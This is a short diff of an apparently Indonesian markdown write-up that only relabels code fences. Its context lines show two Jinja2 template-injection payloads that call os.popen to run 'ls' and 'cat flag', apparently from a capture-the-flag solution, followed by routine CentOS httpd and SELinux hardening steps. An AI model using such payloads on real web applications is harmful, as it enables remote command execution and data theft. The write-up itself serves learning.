@@ -91,13 +91,13 @@ metode peretas untuk menyerang sistem dengan celah keamanan yang tidak teridenti
 
 ls python code
 
-```code
+```text
 {{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls').read()}}
 ```
 
 cat flag python code
 
-```code
+```text
 {{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag').read()}}
 ```
 <br>
@@ -147,24 +147,23 @@ Pada kesempatan kali ini saya akan menggunakan Linux CentOS
 
 1. Install Web Server httpd
 
-```code
+```text
 yum install -y httpd
 ```
 
 2. Tampahkan port 80 tcp
-```code
+```text
 firewall-cmd --permanent --add-port=80/tcp
 ```
 
 3. Buat direktori untuk file html dan isi filenya
-```code
+```text
 # mkdir -p /web1/html/
 # echo "Welcome to Website 1" > /web1/html/index.html
 ```
 
 4. edit isi file config dari httpd_conf
-
-```code
+```text
 # vi /etc/httpd/conf/httpd_conf
 
 # Ubah isi config bagian berikut
@@ -173,15 +172,14 @@ DocumentRoot "/web1/html"
 ```
 
 5. Aktifkan Web Server httpd
-```code
+```text
 systemctl start httpd
 ```
 
 6. Konfigurasi Hardening Whitelisting Selinux (**Bagian Utama**)
-```code
+```text
 # semanage fcontext -a -t httpd_sys_content_t "/web1(/.*)?"
 # restorecon -R /web1
 ```
-
 
 ---
